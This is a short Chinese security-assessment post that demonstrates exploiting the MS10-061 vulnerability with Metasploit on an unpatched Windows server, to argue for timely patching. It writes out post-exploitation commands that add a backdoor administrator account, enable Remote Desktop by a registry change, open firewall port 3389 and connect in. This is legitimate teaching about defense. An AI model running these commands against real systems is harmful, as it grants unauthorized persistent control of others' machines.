在测评过程中，经常见到网站、OA等可进行互联网访问的系统的服务器桌面干干净净，除了输入法就是防火墙、防病毒等软件了，而且安全软件的升级提示在日常使用中多半是点击关闭。据了解，很多管理员觉得自己的操作得当，不会在使用过程中访问到钓鱼网站或下载到病毒文件。那么今天，就向大家演示一下，如果你的系统没有打关键补丁，将利用你开启端口的漏洞进行攻击。

  

![](../Images/81822209f4a47e26fcd7d716b321d5c1.png)

  

攻击者启动`metaspolit`  
采用`ms10-061`进行攻击

![](../Images/a6823ba72a0665fb2dabbf560aba13d3.png)  

![](../Images/b305481168a9681b9f064bee2f9de201.png)

此时返回了一个`meterpreter>`  
可以利用这个传输体载荷执行一些命令

![](../Images/b7682ff8e11f8aa8682668cbc97c252d.png)

通过shell对受害者电脑进行控制

  

创建用户名密码 `dingxin/dingxin`  
`net user dingxin dingxin /add`  
将用户`dingxin`添加入管理组   
`net localgroup administrators dingxin /add`  
开启远程桌面功能   
`REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f`

`netsh firewall set portopening tcp 3389 enable`  
Kali远程桌面连接  
`rdesktop 192.168.1.146:3389`

THE END

在主机测评中，“入侵防范”测评点第三项要求：操作系统应遵循最小安装的原则，仅安装需要的组件和应用程序，并通过设置升级服务器等方式保持系统补丁得到及时更新。通过演示我们应该知道，这条要求不是无故而来的。多少次病毒浪潮，最终都是以厂商更新系统补丁而得以结束，所以为服务器打补丁是一个重要且必要的安全防护手段。
